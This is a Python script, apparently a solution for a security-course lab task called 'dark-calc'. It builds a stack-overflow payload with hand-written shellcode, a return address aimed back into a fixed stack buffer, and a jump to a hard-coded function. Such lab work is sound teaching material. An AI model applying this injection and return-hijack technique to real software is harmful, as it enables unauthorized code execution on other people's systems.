#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
import struct

p64 = lambda x: struct.pack("<Q", x)

# Fixed stack buffer address
buf_addr = 0x721000800fd0

payload = b"sh malware\x00"

# mov edi, 0x6030d0
# mov eax, 0x4017e0
# call rax
# ret
shellcode = (
    b"\xbf" + struct.pack("<I", 0x6030d0)
    + b"\xb8" + struct.pack("<I", 0x4017e0)
    + b"\xff\xd0"
    + b"\xc3"
)

payload += shellcode

assert len(payload) == 24

payload += p64(buf_addr + 11)

payload += p64(0x401880)

sys.stdout.buffer.write(payload + b"\n")
